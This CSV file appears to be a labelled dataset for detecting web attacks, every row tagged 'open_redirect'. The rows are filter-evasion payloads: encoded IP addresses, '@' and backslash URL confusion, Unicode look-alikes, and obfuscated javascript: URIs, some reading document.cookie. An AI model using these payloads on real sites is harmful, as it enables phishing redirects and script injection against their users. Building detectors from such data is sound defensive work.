log,label
http://www.whitelisteddomain.tld@3627734734,open_redirect
http://3H6k7lIAiqjfNeN@3627734734,open_redirect
http://XY>.7d8T\205pZM@3627734734,open_redirect
http://472.314.470.462,open_redirect
http://www.whitelisteddomain.tld@472.314.470.462,open_redirect
http://3H6k7lIAiqjfNeN@472.314.470.462,open_redirect
http://XY>.7d8T\205pZM@472.314.470.462,open_redirect
http://0330.072.0326.0316,open_redirect
http://www.whitelisteddomain.tld@0330.072.0326.0316,open_redirect
http://3H6k7lIAiqjfNeN@0330.072.0326.0316,open_redirect
http://XY>.7d8T\205pZM@0330.072.0326.0316,open_redirect
http://00330.00072.0000326.00000316,open_redirect
http://www.whitelisteddomain.tld@00330.00072.0000326.00000316,open_redirect
http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316,open_redirect
http://XY>.7d8T\205pZM@00330.00072.0000326.00000316,open_redirect
http://[::216.58.214.206],open_redirect
http://www.whitelisteddomain.tld@[::216.58.214.206],open_redirect
http://3H6k7lIAiqjfNeN@[::216.58.214.206],open_redirect
http://XY>.7d8T\205pZM@[::216.58.214.206],open_redirect
http://[::ffff:216.58.214.206],open_redirect
http://www.whitelisteddomain.tld@[::ffff:216.58.214.206],open_redirect
http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206],open_redirect
http://XY>.7d8T\205pZM@[::ffff:216.58.214.206],open_redirect
http://0xd8.072.54990,open_redirect
http://www.whitelisteddomain.tld@0xd8.072.54990,open_redirect
http://3H6k7lIAiqjfNeN@0xd8.072.54990,open_redirect
http://XY>.7d8T\205pZM@0xd8.072.54990,open_redirect
http://0xd8.3856078,open_redirect
http://www.whitelisteddomain.tld@0xd8.3856078,open_redirect
http://3H6k7lIAiqjfNeN@0xd8.3856078,open_redirect
http://XY>.7d8T\205pZM@0xd8.3856078,open_redirect
http://00330.3856078,open_redirect
http://www.whitelisteddomain.tld@00330.3856078,open_redirect
http://3H6k7lIAiqjfNeN@00330.3856078,open_redirect
http://XY>.7d8T\205pZM@00330.3856078,open_redirect
http://00330.0x3a.54990,open_redirect
http://www.whitelisteddomain.tld@00330.0x3a.54990,open_redirect
http://3H6k7lIAiqjfNeN@00330.0x3a.54990,open_redirect
http://XY>.7d8T\205pZM@00330.0x3a.54990,open_redirect
http:0xd8.0x3a.0xd6.0xce,open_redirect
http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce,open_redirect
http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce,open_redirect
http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce,open_redirect
http:0xd83ad6ce,open_redirect
http:www.whitelisteddomain.tld@0xd83ad6ce,open_redirect
http:3H6k7lIAiqjfNeN@0xd83ad6ce,open_redirect
http:XY>.7d8T\205pZM@0xd83ad6ce,open_redirect
http:3627734734,open_redirect
http:www.whitelisteddomain.tld@3627734734,open_redirect
http:3H6k7lIAiqjfNeN@3627734734,open_redirect
http:XY>.7d8T\205pZM@3627734734,open_redirect
http:472.314.470.462,open_redirect
http:www.whitelisteddomain.tld@472.314.470.462,open_redirect
http:3H6k7lIAiqjfNeN@472.314.470.462,open_redirect
http:XY>.7d8T\205pZM@472.314.470.462,open_redirect
http:0330.072.0326.0316,open_redirect
http:www.whitelisteddomain.tld@0330.072.0326.0316,open_redirect
http:3H6k7lIAiqjfNeN@0330.072.0326.0316,open_redirect
http:XY>.7d8T\205pZM@0330.072.0326.0316,open_redirect
http:00330.00072.0000326.00000316,open_redirect
http:www.whitelisteddomain.tld@00330.00072.0000326.00000316,open_redirect
http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316,open_redirect
http:XY>.7d8T\205pZM@00330.00072.0000326.00000316,open_redirect
http:[::216.58.214.206],open_redirect
http:www.whitelisteddomain.tld@[::216.58.214.206],open_redirect
http:3H6k7lIAiqjfNeN@[::216.58.214.206],open_redirect
http:XY>.7d8T\205pZM@[::216.58.214.206],open_redirect
http:[::ffff:216.58.214.206],open_redirect
http:www.whitelisteddomain.tld@[::ffff:216.58.214.206],open_redirect
http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206],open_redirect
http:XY>.7d8T\205pZM@[::ffff:216.58.214.206],open_redirect
http:0xd8.072.54990,open_redirect
http:www.whitelisteddomain.tld@0xd8.072.54990,open_redirect
http:3H6k7lIAiqjfNeN@0xd8.072.54990,open_redirect
http:XY>.7d8T\205pZM@0xd8.072.54990,open_redirect
http:0xd8.3856078,open_redirect
http:www.whitelisteddomain.tld@0xd8.3856078,open_redirect
http:3H6k7lIAiqjfNeN@0xd8.3856078,open_redirect
http:XY>.7d8T\205pZM@0xd8.3856078,open_redirect
http:00330.3856078,open_redirect
http:www.whitelisteddomain.tld@00330.3856078,open_redirect
http:3H6k7lIAiqjfNeN@00330.3856078,open_redirect
http:XY>.7d8T\205pZM@00330.3856078,open_redirect
http:00330.0x3a.54990,open_redirect
http:www.whitelisteddomain.tld@00330.0x3a.54990,open_redirect
http:3H6k7lIAiqjfNeN@00330.0x3a.54990,open_redirect
http:XY>.7d8T\205pZM@00330.0x3a.54990,open_redirect
〱localdomain.pw,open_redirect
〵localdomain.pw,open_redirect
ゝlocaldomain.pw,open_redirect
ーlocaldomain.pw,open_redirect
ｰlocaldomain.pw,open_redirect
/〱localdomain.pw,open_redirect
/〵localdomain.pw,open_redirect
/ゝlocaldomain.pw,open_redirect
/ーlocaldomain.pw,open_redirect
/ｰlocaldomain.pw,open_redirect
%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d,open_redirect
http://%67%6f%6f%67%6c%65%2e%63%6f%6d,open_redirect
<>//localdomain.pw,open_redirect
//localdomain.pw\@www.whitelisteddomain.tld,open_redirect
https://:@localdomain.pw\@www.whitelisteddomain.tld,open_redirect
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1),open_redirect
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1),open_redirect
ja\nva\tscript\r:alert(1),open_redirect
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\),open_redirect
\152\141\166\141\163\143\162\151\160\164\072alert(1),open_redirect
http://localdomain.pw:80#@www.whitelisteddomain.tld/,open_redirect
http://localdomain.pw:80?@www.whitelisteddomain.tld/,open_redirect
http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@localdomain.pw/,open_redirect
http://XY>.7d8T\205pZM@www.whitelisteddomain.tld+@localdomain.pw/,open_redirect
http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@localdomain.pw/,open_redirect
http://XY>.7d8T\205pZM@www.whitelisteddomain.tld@localdomain.pw/,open_redirect
http://www.whitelisteddomain.tld+&@localdomain.pw#+@www.whitelisteddomain.tld/,open_redirect
http://localdomain.pw\twww.whitelisteddomain.tld/,open_redirect
//localdomain.pw:80#@www.whitelisteddomain.tld/,open_redirect
//localdomain.pw:80?@www.whitelisteddomain.tld/,open_redirect
//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@localdomain.pw/,open_redirect
//XY>.7d8T\205pZM@www.whitelisteddomain.tld+@localdomain.pw/,open_redirect
//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@localdomain.pw/,open_redirect
//XY>.7d8T\205pZM@www.whitelisteddomain.tld@localdomain.pw/,open_redirect
//www.whitelisteddomain.tld+&@localdomain.pw#+@www.whitelisteddomain.tld/,open_redirect
//localdomain.pw\twww.whitelisteddomain.tld/,open_redirect
@localdomain.pw,open_redirect
javascript://https://www.whitelisteddomain.tld/?z=%0Aalert(1),open_redirect
http://localdomain.pw%2f%2f.www.whitelisteddomain.tld/,open_redirect
http://localdomain.pw%5c%5c.www.whitelisteddomain.tld/,open_redirect
http://localdomain.pw%3F.www.whitelisteddomain.tld/,open_redirect
http://localdomain.pw%23.www.whitelisteddomain.tld/,open_redirect
http://www.whitelisteddomain.tld:80%40localdomain.pw/,open_redirect
http://www.whitelisteddomain.tld%2elocaldomain.pw/,open_redirect
/x:1/:///%01javascript:alert(document.cookie)/,open_redirect
/https:/%5clocaldomain.pw/,open_redirect
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie),open_redirect
/http://localdomain.pw,open_redirect
/%2f%2flocaldomain.pw,open_redirect
/localdomain.pw/%2f%2e%2e,open_redirect
/http:/localdomain.pw,open_redirect
/.localdomain.pw,open_redirect
http://.localdomain.pw,open_redirect
.localdomain.pw,open_redirect
///localdomain.pw,open_redirect
/////localdomain.pw/,open_redirect
/////localdomain.pw,open_redirect
java%0ascript:alert(1),open_redirect
java%09script:alert(1),open_redirect
java%0dscript:alert(1),open_redirect
javascript://%0aalert(1),open_redirect
http://www.localdomain.pw\.www.whitelisteddomain.tld,open_redirect
%19Jav%09asc%09ript:https%20://www.whitelisteddomain.tld/%250Aconfirm%25281%2529,open_redirect
//example.com@google.com/%2f..,open_redirect
///google.com/%2f..,open_redirect
///example.com@google.com/%2f..,open_redirect
////google.com/%2f..,open_redirect
////example.com@google.com/%2f..,open_redirect
https://google.com/%2f..,open_redirect
https://example.com@google.com/%2f..,open_redirect
/https://google.com/%2f..,open_redirect
/https://example.com@google.com/%2f..,open_redirect
//google.com/%2f%2e%2e,open_redirect
//example.com@google.com/%2f%2e%2e,open_redirect
///google.com/%2f%2e%2e,open_redirect
///example.com@google.com/%2f%2e%2e,open_redirect
////google.com/%2f%2e%2e,open_redirect
////example.com@google.com/%2f%2e%2e,open_redirect
https://google.com/%2f%2e%2e,open_redirect
https://example.com@google.com/%2f%2e%2e,open_redirect
/https://google.com/%2f%2e%2e,open_redirect
/https://example.com@google.com/%2f%2e%2e,open_redirect
//google.com/,open_redirect
//example.com@google.com/,open_redirect
///google.com/,open_redirect
///example.com@google.com/,open_redirect
////google.com/,open_redirect
////example.com@google.com/,open_redirect
https://google.com/,open_redirect
https://example.com@google.com/,open_redirect
/https://google.com/,open_redirect
/https://example.com@google.com/,open_redirect
//google.com//,open_redirect
//example.com@google.com//,open_redirect
///google.com//,open_redirect
///example.com@google.com//,open_redirect
////google.com//,open_redirect
////example.com@google.com//,open_redirect
https://google.com//,open_redirect
https://example.com@google.com//,open_redirect
//https://google.com//,open_redirect
//https://example.com@google.com//,open_redirect
//google.com/%2e%2e%2f,open_redirect
//example.com@google.com/%2e%2e%2f,open_redirect
///google.com/%2e%2e%2f,open_redirect
///example.com@google.com/%2e%2e%2f,open_redirect
////google.com/%2e%2e%2f,open_redirect
////example.com@google.com/%2e%2e%2f,open_redirect
https://google.com/%2e%2e%2f,open_redirect
https://example.com@google.com/%2e%2e%2f,open_redirect
//https://google.com/%2e%2e%2f,open_redirect
//https://example.com@google.com/%2e%2e%2f,open_redirect
///google.com/%2e%2e,open_redirect
///example.com@google.com/%2e%2e,open_redirect
////google.com/%2e%2e,open_redirect
////example.com@google.com/%2e%2e,open_redirect
https:///google.com/%2e%2e,open_redirect
https:///example.com@google.com/%2e%2e,open_redirect
//https:///google.com/%2e%2e,open_redirect
//example.com@https:///google.com/%2e%2e,open_redirect
/https://google.com/%2e%2e,open_redirect
/https://example.com@google.com/%2e%2e,open_redirect
///google.com/%2f%2e%2e,open_redirect
///example.com@google.com/%2f%2e%2e,open_redirect
////google.com/%2f%2e%2e,open_redirect
////example.com@google.com/%2f%2e%2e,open_redirect
https:///google.com/%2f%2e%2e,open_redirect
https:///example.com@google.com/%2f%2e%2e,open_redirect
/https://google.com/%2f%2e%2e,open_redirect
/https://example.com@google.com/%2f%2e%2e,open_redirect
/https:///google.com/%2f%2e%2e,open_redirect
/https:///example.com@google.com/%2f%2e%2e,open_redirect
/%09/google.com,open_redirect
/%09/example.com@google.com,open_redirect
//%09/google.com,open_redirect
//%09/example.com@google.com,open_redirect
///%09/google.com,open_redirect
///%09/example.com@google.com,open_redirect
////%09/google.com,open_redirect
////%09/example.com@google.com,open_redirect
https://%09/google.com,open_redirect
https://%09/example.com@google.com,open_redirect
/%5cgoogle.com,open_redirect
/%5cexample.com@google.com,open_redirect
//%5cgoogle.com,open_redirect
//%5cexample.com@google.com,open_redirect
///%5cgoogle.com,open_redirect
///%5cexample.com@google.com,open_redirect
////%5cgoogle.com,open_redirect
////%5cexample.com@google.com,open_redirect
https://%5cgoogle.com,open_redirect
https://%5cexample.com@google.com,open_redirect
/https://%5cgoogle.com,open_redirect
/https://%5cexample.com@google.com,open_redirect
https://google.com,open_redirect
https://example.com@google.com,open_redirect
javascript:alert(1),open_redirect
//javascript:alert(1),open_redirect
/javascript:alert(1),open_redirect
/%5cjavascript:alert(1),open_redirect
//%5cjavascript:alert(1),open_redirect
/%09/javascript:alert(1),open_redirect
java%0d%0ascript%0d%0a:alert(0),open_redirect
//google.com,open_redirect
https:google.com,open_redirect
//google%E3%80%82com,open_redirect
\/\/google.com/,open_redirect
/\/google.com/,open_redirect
//google%00.com,open_redirect
https://example.com/https://google.com/,open_redirect
javascript://example.com?%a0alert%281%29,open_redirect
http://0xd8.0x3a.0xd6.0xce,open_redirect
http://example.com@0xd8.0x3a.0xd6.0xce,open_redirect
http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce,open_redirect
http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce,open_redirect
http://0xd83ad6ce,open_redirect
http://example.com@0xd83ad6ce,open_redirect
http://3H6k7lIAiqjfNeN@0xd83ad6ce,open_redirect
http://XY>.7d8T\205pZM@0xd83ad6ce,open_redirect
http://3627734734,open_redirect
http://example.com@3627734734,open_redirect
http://3H6k7lIAiqjfNeN@3627734734,open_redirect
http://XY>.7d8T\205pZM@3627734734,open_redirect
http://472.314.470.462,open_redirect
http://example.com@472.314.470.462,open_redirect
http://3H6k7lIAiqjfNeN@472.314.470.462,open_redirect
http://XY>.7d8T\205pZM@472.314.470.462,open_redirect
http://0330.072.0326.0316,open_redirect
http://example.com@0330.072.0326.0316,open_redirect
http://3H6k7lIAiqjfNeN@0330.072.0326.0316,open_redirect
http://XY>.7d8T\205pZM@0330.072.0326.0316,open_redirect
http://00330.00072.0000326.00000316,open_redirect
http://example.com@00330.00072.0000326.00000316,open_redirect
http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316,open_redirect
http://XY>.7d8T\205pZM@00330.00072.0000326.00000316,open_redirect
http://[::216.58.214.206],open_redirect
http://example.com@[::216.58.214.206],open_redirect
http://3H6k7lIAiqjfNeN@[::216.58.214.206],open_redirect
http://XY>.7d8T\205pZM@[::216.58.214.206],open_redirect
http://[::ffff:216.58.214.206],open_redirect
http://example.com@[::ffff:216.58.214.206],open_redirect
http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206],open_redirect
http://XY>.7d8T\205pZM@[::ffff:216.58.214.206],open_redirect
http://0xd8.072.54990,open_redirect
http://example.com@0xd8.072.54990,open_redirect
http://3H6k7lIAiqjfNeN@0xd8.072.54990,open_redirect
http://XY>.7d8T\205pZM@0xd8.072.54990,open_redirect
http://0xd8.3856078,open_redirect
http://example.com@0xd8.3856078,open_redirect
http://3H6k7lIAiqjfNeN@0xd8.3856078,open_redirect
http://XY>.7d8T\205pZM@0xd8.3856078,open_redirect
http://00330.3856078,open_redirect
http://example.com@00330.3856078,open_redirect
http://3H6k7lIAiqjfNeN@00330.3856078,open_redirect
http://XY>.7d8T\205pZM@00330.3856078,open_redirect
http://00330.0x3a.54990,open_redirect
http://example.com@00330.0x3a.54990,open_redirect
http://3H6k7lIAiqjfNeN@00330.0x3a.54990,open_redirect
http://XY>.7d8T\205pZM@00330.0x3a.54990,open_redirect
http:0xd8.0x3a.0xd6.0xce,open_redirect
http:example.com@0xd8.0x3a.0xd6.0xce,open_redirect
http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce,open_redirect
http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce,open_redirect
http:0xd83ad6ce,open_redirect
http:example.com@0xd83ad6ce,open_redirect
http:3H6k7lIAiqjfNeN@0xd83ad6ce,open_redirect
http:XY>.7d8T\205pZM@0xd83ad6ce,open_redirect
http:3627734734,open_redirect
http:example.com@3627734734,open_redirect
http:3H6k7lIAiqjfNeN@3627734734,open_redirect
http:XY>.7d8T\205pZM@3627734734,open_redirect
http:472.314.470.462,open_redirect
http:example.com@472.314.470.462,open_redirect
http:3H6k7lIAiqjfNeN@472.314.470.462,open_redirect
http:XY>.7d8T\205pZM@472.314.470.462,open_redirect
http:0330.072.0326.0316,open_redirect
http:example.com@0330.072.0326.0316,open_redirect
http:3H6k7lIAiqjfNeN@0330.072.0326.0316,open_redirect
http:XY>.7d8T\205pZM@0330.072.0326.0316,open_redirect
http:00330.00072.0000326.00000316,open_redirect
http:example.com@00330.00072.0000326.00000316,open_redirect
http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316,open_redirect
http:XY>.7d8T\205pZM@00330.00072.0000326.00000316,open_redirect
http:[::216.58.214.206],open_redirect
http:example.com@[::216.58.214.206],open_redirect
http:3H6k7lIAiqjfNeN@[::216.58.214.206],open_redirect
http:XY>.7d8T\205pZM@[::216.58.214.206],open_redirect
http:[::ffff:216.58.214.206],open_redirect
http:example.com@[::ffff:216.58.214.206],open_redirect
http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206],open_redirect
http:XY>.7d8T\205pZM@[::ffff:216.58.214.206],open_redirect
http:0xd8.072.54990,open_redirect
http:example.com@0xd8.072.54990,open_redirect
http:3H6k7lIAiqjfNeN@0xd8.072.54990,open_redirect
http:XY>.7d8T\205pZM@0xd8.072.54990,open_redirect
http:0xd8.3856078,open_redirect
http:example.com@0xd8.3856078,open_redirect
http:3H6k7lIAiqjfNeN@0xd8.3856078,open_redirect
http:XY>.7d8T\205pZM@0xd8.3856078,open_redirect
http:00330.3856078,open_redirect
http:example.com@00330.3856078,open_redirect
http:3H6k7lIAiqjfNeN@00330.3856078,open_redirect
http:XY>.7d8T\205pZM@00330.3856078,open_redirect
http:00330.0x3a.54990,open_redirect
http:example.com@00330.0x3a.54990,open_redirect
http:3H6k7lIAiqjfNeN@00330.0x3a.54990,open_redirect
http:XY>.7d8T\205pZM@00330.0x3a.54990,open_redirect
〱google.com,open_redirect
〵google.com,open_redirect
ゝgoogle.com,open_redirect
ーgoogle.com,open_redirect
ｰgoogle.com,open_redirect
/〱google.com,open_redirect
/〵google.com,open_redirect
/ゝgoogle.com,open_redirect
/ーgoogle.com,open_redirect
/ｰgoogle.com,open_redirect
%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d,open_redirect
http://%67%6f%6f%67%6c%65%2e%63%6f%6d,open_redirect
<>//google.com,open_redirect
//google.com\@example.com,open_redirect
https://:@google.com\@example.com,open_redirect
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1),open_redirect
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1),open_redirect
ja\nva\tscript\r:alert(1),open_redirect
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\),open_redirect
\152\141\166\141\163\143\162\151\160\164\072alert(1),open_redirect
http://google.com:80#@example.com/,open_redirect
http://google.com:80?@example.com/,open_redirect
http://3H6k7lIAiqjfNeN@example.com+@google.com/,open_redirect
http://XY>.7d8T\205pZM@example.com+@google.com/,open_redirect
http://3H6k7lIAiqjfNeN@example.com@google.com/,open_redirect
http://XY>.7d8T\205pZM@example.com@google.com/,open_redirect
http://example.com+&@google.com#+@example.com/,open_redirect
http://google.com\texample.com/,open_redirect
//google.com:80#@example.com/,open_redirect
//google.com:80?@example.com/,open_redirect
//3H6k7lIAiqjfNeN@example.com+@google.com/,open_redirect
//XY>.7d8T\205pZM@example.com+@google.com/,open_redirect
//3H6k7lIAiqjfNeN@example.com@google.com/,open_redirect
//XY>.7d8T\205pZM@example.com@google.com/,open_redirect
//example.com+&@google.com#+@example.com/,open_redirect
//google.com\texample.com/,open_redirect
@google.com,open_redirect
javascript://https://example.com/?z=%0Aalert(1),open_redirect
http://google.com%2f%2f.example.com/,open_redirect
http://google.com%5c%5c.example.com/,open_redirect
http://google.com%3F.example.com/,open_redirect
http://google.com%23.example.com/,open_redirect
http://example.com:80%40google.com/,open_redirect
http://example.com%2egoogle.com/,open_redirect
/x:1/:///%01javascript:alert(document.cookie)/,open_redirect
/https:/%5cgoogle.com/,open_redirect
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie),open_redirect
/http://google.com,open_redirect
/%2f%2fgoogle.com,open_redirect
/google.com/%2f%2e%2e,open_redirect
/http:/google.com,open_redirect
/.google.com,open_redirect
///google.com,open_redirect
/////google.com/,open_redirect
